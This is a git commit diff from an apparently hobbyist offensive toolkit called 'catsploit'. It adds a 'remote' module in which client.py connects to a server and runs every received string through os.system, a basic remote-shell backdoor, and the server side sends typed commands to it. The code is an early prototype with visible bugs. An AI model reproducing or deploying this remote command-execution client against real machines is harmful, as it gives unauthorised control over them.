77fddc1cd9b4f2d8fd4ddb081f8b60ffeb9ad20e
catsploit <nicolas.schnitz@gmail.com>
2020-02-12 03:04:59 -0300

    Doing the first 'remote' tests. The port variable is not recognized as assigned

--- config/modules/remote/client.py
+++ config/modules/remote/client.py
@@ -1,13 +1,23 @@
 import socket
 import os
 from remote_runfile import *
+from colorama import *
+init()
 
-class SClient:
-    def __init__(self):
+class SClient():
+    def recvinstruction(self):
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         client.connect(server_addres)
 
-    def recvinstruction(self):
-        instruction = client.recv(1024)
-        instruction = instruction.decode()
-        os.system(instruction)
+        while True:
+            instruction = client.recv(1024)
+            instruction = instruction.decode()
+            os.system(instruction)
+
+            if instruction == "exit":
+                print("{}- client terminated -{}".format(Style.BRIGHT+Fore.CYAN,Style.RESET_ALL))
+                client.close()
+                break
+
+obj_client = SClient()
+obj_client.recvinstruction()
--- config/modules/remote/remote_runfile.py
+++ config/modules/remote/remote_runfile.py
@@ -11,49 +11,72 @@ class CommandLine():
             if line.startswith("set"):
                 self.set(line)
 
+            elif line == "runserver":
+                try:
+                    obj_server = SServer()
+                    obj_server.runserver()
+
+                except Exception as e:
+                    print("{}[Cat] Error: '{}'{}".format(Style.BRIGHT+Fore.RED,e,Style.RESET_ALL))
+
             elif line == "exit":
-                print("{}[remote] //Leaving . . .".format(Style.BRIGHT+Fore.CYAN))
+                print("{}[remote] //Leaving . . .\n".format(Style.BRIGHT+Fore.CYAN))
+                exit()
 
             elif line == "":
-                print("\n")
+                print("")
 
             else:
-                print("{}[remote] Error: Unknown command '{}'".format(Style.RESET_ALL+Fore.RED,line))
+                print("{}[remote] Error: Unknown command '{}'\n".format(Style.RESET_ALL+Fore.RED,line))
 
 
     def set(self, line):
         var = line.split(" ")
+        print(var)
 
         if len(var) == 1:
-            print("{}[remote] {}set >> defines variables within the environment".format(Style.BRIGHT+Fore.CYAN,Fore.BLACK))
+            print("{}[remote] {}set >> defines variables within the environment\n".format(Style.BRIGHT+Fore.CYAN,Fore.BLACK))
 
         elif var[1] == "port":
-            if len(var) == 2:
+            if len(var) == 3:
                 port = var[2]
+                port = int(port)
+                print(port)
+
             else:
-                print("{}[Cat] port >> defines the port where your server/client will start{}".format(Style.BRIGHT+Fore.CYAN,Style.RESET_ALL))
+                print("{}[Cat] port >> defines the port where your server/client will start{}\n".format(Style.BRIGHT+Fore.CYAN,Style.RESET_ALL))
 
         elif var[1] == "inlan":
             try:
+                print(port)
                 self.server_addres = ('localhost', port)
                 server_addres = self.server_addres
 
             except Exception as e:
-                print("{}[Cat] Error: '{}' try to fix it by defining a port{}".format(Style.BRIGHT+Fore.RED,e,Style.RESET_ALL))
+                print("{}[Cat] Error: '{}' try to fix it by defining a port{}\n".format(Fore.RED,e,Style.RESET_ALL))
 
+        else:
+            print("{}[Cat] Unknown argument '{}'{}\n".format(Fore.RED,var[1],Style.RESET_ALL))
 
 class SServer(CommandLine):
-    def __init__(self):
+    def runserver(self):
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         server.bind(server_addres)
         server.listen(2)
         connection, addr = server.accept()
 
-    def runserver(self)
         while True:
             op = input("\033[4;32m"+"[remote]"+"\033[0;36m"+"\033[1;36m"+"(cmd)"+"\033[0;32m > "+"\033[0;37m")
             op = op.encode()
             server.send(op)
+
+            op = op.decode()
+
+            if op == "exit":
+                print("{}- connection terminated -{}".format(Style.BRIGHT+Fore.CYAN,Style.RESET_ALL))
+                connection.close()
+                server.close()
+                break
 
 # - Starting - #
 remote_input = CommandLine()
